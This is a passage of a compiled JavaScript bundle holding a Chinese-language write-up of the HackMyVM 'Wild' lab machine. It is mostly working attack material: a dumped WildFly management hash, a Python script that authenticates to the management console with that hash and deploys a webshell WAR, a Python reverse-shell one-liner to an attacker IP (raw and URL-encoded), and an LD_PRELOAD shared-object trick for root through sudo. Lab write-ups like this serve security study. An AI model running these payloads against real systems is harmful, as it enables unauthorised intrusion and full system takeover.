192.168.56.106:44852\n[18:20:53] 192.168.56.106:44852: registered new host w/ db\n(local) pwncat$ back\n(remote) www-data@wild.hmv:/var/www/html$ whoami\nwww-data\n"})}),"\n",(0,o.jsx)(n.h2,{id:"\u5229\u7528-wildfly-\u5f97\u5230\u7684\u7528\u6237\u54c8\u5e0c\u90e8\u7f72-webshell",children:"\u5229\u7528 WildFly \u5f97\u5230\u7684\u7528\u6237\u54c8\u5e0c\u90e8\u7f72 Webshell"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",metastring:'title="/opt/wildfly/domain/configuration/mgmt-users.properties"',children:"#\n# Properties declaration of users for the realm 'ManagementRealm' which is the default realm\n# for new installations. Further authentication mechanism can be configured\n# as part of the <management /> in host.xml.\n#\n# Users can be added to this properties file at any time, updates after the server has started\n# will be automatically detected.\n#\n# By default the properties realm expects the entries to be in the format: -\n# username=HEX(MD5( username ':' realm ':' password))\n#\n# A utility script is provided which can be executed from the bin folder to add the users: -\n# - Linux\n#  bin/add-user.sh\n#\n# - Windows\n#  bin\\add-user.bat\n#\n#$REALM_NAME=ManagementRealm$ This line is used by the add-user utility to identify the realm name already used in this file.\n#\n# On start-up the server will also automatically add a user $local - this user is specifically\n# for local tools running against this AS installation.\n#\n# The following illustrates how an admin user could be defined, this\n# is for illustration only and does not correspond to a usable password.\n#\nadministrator=3bfa7f34174555fe766d0e0295821742\n"})}),"\n",(0,o.jsx)(n.h3,{id:"\u5229\u7528\u7528\u6237\u540d\u4e0e\u54c8\u5e0c\u8fdb\u5165-console-\u90e8\u7f72-war-\u5305",children:"\u5229\u7528\u7528\u6237\u540d\u4e0e\u54c8\u5e0c\u8fdb\u5165 console \u90e8\u7f72 war \u5305"}),"\n",(0,o.jsxs)(r,{children:[(0,o.jsx)("summary",{children:" Jboss_cracker.py "}),(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-python",children:'from urllib.parse import urlparse\nfrom requests.auth import *\nimport hashlib\nimport os\nimport re\nimport threading\nimport time\nimport warnings\nfrom base64 import b64encode\n\n\n\nclass HTTPDigestAuth1(AuthBase):\n    """Attaches HTTP Digest Authentication to the given Request object."""\n\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n        self._thread_local = threading.local()\n\n    def init_per_thread_state(self):\n        if not hasattr(self._thread_local, "init"):\n            self._thread_local.init = True\n            self._thread_local.last_nonce = ""\n            self._thread_local.nonce_count = 0\n            self._thread_local.chal = {}\n            self._thread_local.pos = None\n            self._thread_local.num_401_calls = None\n\n    def build_digest_header(self, method, url):\n        """\n        :rtype: str\n        """\n\n        realm = self._thread_local.chal["realm"]\n        nonce = self._thread_local.chal["nonce"]\n        qop = self._thread_local.chal.get("qop")\n        algorithm = self._thread_local.chal.get("algorithm")\n        opaque = self._thread_local.chal.get("opaque")\n        hash_utf8 = None\n\n        if algorithm is None:\n            _algorithm = "MD5"\n        else:\n            _algorithm = algorithm.upper()\n        if _algorithm == "MD5" or _algorithm == "MD5-SESS":\n\n            def md5_utf8(x):\n                if isinstance(x, str):\n                    x = x.encode("utf-8")\n                return hashlib.md5(x).hexdigest()\n\n            hash_utf8 = md5_utf8\n        elif _algorithm == "SHA":\n\n            def sha_utf8(x):\n                if isinstance(x, str):\n                    x = x.encode("utf-8")\n                return hashlib.sha1(x).hexdigest()\n\n            hash_utf8 = sha_utf8\n        elif _algorithm == "SHA-256":\n\n            def sha256_utf8(x):\n                if isinstance(x, str):\n                    x = x.encode("utf-8")\n                return hashlib.sha256(x).hexdigest()\n\n            hash_utf8 = sha256_utf8\n        elif _algorithm == "SHA-512":\n\n            def sha512_utf8(x):\n                if isinstance(x, str):\n                    x = x.encode("utf-8")\n                return hashlib.sha512(x).hexdigest()\n\n            hash_utf8 = sha512_utf8\n\n        KD = lambda s, d: hash_utf8(f"{s}:{d}")  # noqa:E731\n\n        if hash_utf8 is None:\n            return None\n\n        entdig = None\n        p_parsed = urlparse(url)\n        path = p_parsed.path or "/"\n        if p_parsed.query:\n            path += f"?{p_parsed.query}"\n\n        A1 = f"{self.username}:{realm}:{self.password}"\n        A2 = f"{method}:{path}"\n\n        # HA1 = hash_utf8(A1)\n        HA1 = self.realAuth\n        HA2 = hash_utf8(A2)\n\n        if nonce == self._thread_local.last_nonce:\n            self._thread_local.nonce_count += 1\n        else:\n            self._thread_local.nonce_count = 1\n        ncvalue = f"{self._thread_local.nonce_count:08x}"\n        s = str(self._thread_local.nonce_count).encode("utf-8")\n        s += nonce.encode("utf-8")\n        s += time.ctime().encode("utf-8")\n        s += os.urandom(8)\n\n        cnonce = hashlib.sha1(s).hexdigest()[:16]\n        if _algorithm == "MD5-SESS":\n            HA1 = hash_utf8(f"{HA1}:{nonce}:{cnonce}")\n\n        if not qop:\n            respdig = KD(HA1, f"{nonce}:{HA2}")\n        elif qop == "auth" or "auth" in qop.split(","):\n            noncebit = f"{nonce}:{ncvalue}:{cnonce}:auth:{HA2}"\n            respdig = KD(HA1, noncebit)\n        else:\n            return None\n\n        self._thread_local.last_nonce = nonce\n\n        base = (\n            f\'username="{self.username}", realm="{realm}", nonce="{nonce}",\'\n            f\'uri="{path}", response="{respdig}"\'\n        )\n        if opaque:\n            base += f\', opaque="{opaque}"\'\n        if algorithm:\n            base += f\', algorithm="{algorithm}"\'\n        if entdig:\n            base += f\', digest="{entdig}"\'\n        if qop:\n            base += f\', qop="auth", nc={ncvalue}, cnonce="{cnonce}"\'\n\n        return f"Digest {base}"\n\n    def handle_redirect(self, r, **kwargs):\n        """Reset num_401_calls counter on redirects."""\n        if r.is_redirect:\n            self._thread_local.num_401_calls = 1\n\n    def handle_401(self, r, **kwargs):\n        """\n        Takes the given response and tries digest-auth, if needed.\n\n        :rtype: requests.Response\n        """\n\n        if not 400 <= r.status_code < 500:\n            self._thread_local.num_401_calls = 1\n            return r\n\n        if self._thread_local.pos is not None:\n            r.request.body.seek(self._thread_local.pos)\n        s_auth = r.headers.get("www-authenticate", "")\n\n        if "digest" in s_auth.lower() and self._thread_local.num_401_calls < 2:\n\n            self._thread_local.num_401_calls += 1\n            pat = re.compile(r"digest", flags=re.IGNORECASE)\n            self._thread_local.chal = parse_dict_header(pat.sub("", s_auth, count=1))\n\n            r.content\n            r.close()\n            prep = r.request.copy()\n            extract_cookies_to_jar(prep._cookies, r.request, r.raw)\n            prep.prepare_cookies(prep._cookies)\n\n            prep.headers["Authorization"] = self.build_digest_header(\n                prep.method, prep.url\n            )\n            _r = r.connection.send(prep, **kwargs)\n            _r.history.append(r)\n            _r.request = prep\n\n            return _r\n\n        self._thread_local.num_401_calls = 1\n        return r\n\n    def __call__(self, r):\n        self.init_per_thread_state()\n        if self._thread_local.last_nonce:\n            r.headers["Authorization"] = self.build_digest_header(r.method, r.url)\n        try:\n            self._thread_local.pos = r.body.tell()\n        except AttributeError:\n            self._thread_local.pos = None\n        r.register_hook("response", self.handle_401)\n        r.register_hook("response", self.handle_redirect)\n        self._thread_local.num_401_calls = 1\n\n        return r\n\n    def __eq__(self, other):\n        return all(\n            [\n                self.username == getattr(other, "username", None),\n                self.password == getattr(other, "password", None),\n            ]\n        )\n\n    def __ne__(self, other):\n        return not self == other\n\nimport requests\ndef main():\n    auth = HTTPDigestAuth1(\'administrator\', \'idk\')\n    auth.realAuth = \'3bfa7f34174555fe766d0e0295821742\'\n    r = requests.get(\'http://192.168.56.106:9990/management?operation=attribute&name=server-state&json.pretty=1\', auth=auth)\n    _ = r.status_code\n    print(_)\n    print(r.text)\n    assert _ == 200\n    r = requests.post(\'http://192.168.56.106:9990/management/add-content\',files={"file":open("shell.war","rb")}, auth=auth)\n    _ = r.status_code\n    print(_)\n    print(r.text)\n    resp = r.json()\n    v = resp[\'result\']\n    url = \'http://192.168.56.106:9990/management\'\n    data = {\n        "content": [\n            {"hash": v}\n        ],\n        "address": [{"deployment": "tiny-webapp.war"}],\n        "operation": "add",\n        "enabled": "true"\n    }\n    headers = {\'Content-Type\': \'application/json\'}\n\n    response = requests.post(url, json=data, auth=auth, headers=headers)\n    print(response.status_code)\n    print(response.text)\n\n\n__name__ == "__main__" and main()\n'})})]}),"\n",(0,o.jsxs)(r,{children:[(0,o.jsx)("summary",{children:" shell.war "}),(0,o.jsx)(n.p,{children:(0,o.jsx)(n.a,{target:"_blank","data-noBrokenLinkCheck":!0,href:t(22783).Z+"",children:"shell.war"})})]}),"\n",(0,o.jsxs)(n.p,{children:["\u6267\u884c\u540e\uff0c\u5373\u53ef\u5728 ",(0,o.jsx)(n.code,{children:"http://192.168.56.106:8080/tiny-webapp/shell.jsp"})," \u8bbf\u95ee webshell"]}),"\n",(0,o.jsx)(n.h3,{id:"\u53cd\u5f39-shell",children:"\u53cd\u5f39 shell"}),"\n",(0,o.jsxs)(n.p,{children:["\u56e0\u4e3a Java \u4e2d\u7f16\u7801\u7684\u7279\u6027\uff0c\u5efa\u8bae\u6267\u884c\u53cd\u5411 shell \u7684\u65f6\u5019\u5148\u7ecf\u8fc7\u4e00\u5c42 base64 \u7f16\u7801\uff0c\u5177\u4f53\u53ef\u4ee5\u53c2\u8003\uff1a",(0,o.jsx)(n.a,{href:"https://www.lintstar.top/shell-java/",children:"java.lang.Runtime.exec\uff08\uff09\u6709\u6548\u8f7d\u8377\u89e3\u51b3\u65b9\u6cd5 | \u79bb\u6cab\u51cc\u5929\u0e53"})]}),"\n",(0,o.jsx)(n.p,{children:"\u539f payload \u4e3a\uff1a"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",children:'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")\'\n'})}),"\n",(0,o.jsx)(n.p,{children:"\u5177\u4f53\u7684\u94fe\u63a5\u4e3a"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",children:"http://192.168.56.106:8080/tiny-webapp/shell.jsp?cmd=python3+-c+%27import+socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.56.102%22%2C6666%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B+os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport+pty%3B+pty.spawn%28%22bash%22%29%27\n"})}),"\n",(0,o.jsx)(n.p,{children:"\u5373\u53ef\u6536\u5230\u56de\u8fde\u7684 shell"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $pwncat-cs -lp 6666\n[19:31:36] Welcome to pwncat \ud83d\udc08!                                                                                                                                                                 __main__.py:164\n[19:33:31] received connection from 192.168.56.106:34176                                                                                                                                              bind.py:84\n[19:33:32] 192.168.56.106:34176: registered new host w/ db                                                                                                                                        manager.py:957\n(local) pwncat$ back\n(remote) tod@wild.hmv:/opt/wildfly/bin$ whoami\ntod\n"})}),"\n",(0,o.jsx)(n.h2,{id:"user---tod",children:"User - tod"}),"\n",(0,o.jsx)(n.h3,{id:"flag---user",children:"flag - user"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-shell",children:"(remote) tod@wild.hmv:/home/tod$ cat user.txt\nc1cc7f5179a168ec93095695f20c9e3f\n"})}),"\n",(0,o.jsx)(n.h3,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo -l"',children:"Matching Defaults entries for tod on wild:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser tod may run the following commands on wild:\n    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/info\n"})}),"\n",(0,o.jsx)(n.h2,{id:"user---root",children:"User - root"}),"\n",(0,o.jsx)(n.p,{children:"\u53ef\u4ee5\u501f\u52a9 SETENV \u5b9e\u73b0\u94fe\u63a5\u5e93\u6ce8\u5165\uff0c\u4ece\u800c\u5b9e\u73b0\u4ee3\u7801\u6267\u884c"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",metastring:'title="exia.c"',children:'#include <stdio.h>\n#include <stdlib.h>\n\n__attribute__((constructor))\nvoid init()\n{\n    puts("Hello dynamic linkage world!");\n    unsetenv("LD_PRELOAD");\n    system("/bin/bash");\n}\n'})}),"\n",(0,o.jsx)(n.p,{children:"\u7136\u540e\u7f16\u8bd1\u6ce8\u5165"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-shell",children:"(remote) tod@wild.hmv:/home/tod$ nano exia.c\n(remote) tod@wild.hmv:/home/tod$ gcc -shared -fPIC -o exia.so exia.c\n(remote) tod@wild.hmv:/home/tod$ sudo LD_PRELOAD=/home/tod/exia.so /usr/bin/info\nHello dynamic linkage world!\nroot@wild:/home/tod# whoami\nroot\n"})}),"\n",(0,o.jsx)(n.h3,{id:"flag---root",children:"flag - root"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-shell",children:"root@wild:~# cat root.txt\nd8592e5a179d4b80e099f4c9a460c6e4\n"})})]})}function h(e={}){const{wrapper:n}={...(0,s.a)(),...e.components};return n?(0,o.jsx)(n,{...e,children:(0,o.jsx)(d,{...e})}):d(e)}},22783:(e,n,t)=>{t.d(n,{Z:()=>o});const o=t.p+"assets/files/shell-69810e2bd3e608c07184d609212ddcbf.war"},11151:(e,n,t)=>{t.d(n,{Z:()=>a,a:()=>i});var o=t(67294);const s={},r=o.createContext(s);function i(e){const n=o.useContext(r);return o.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:i(e.components),o.createElement(r.Provider,{value:n},e.children)}}}]);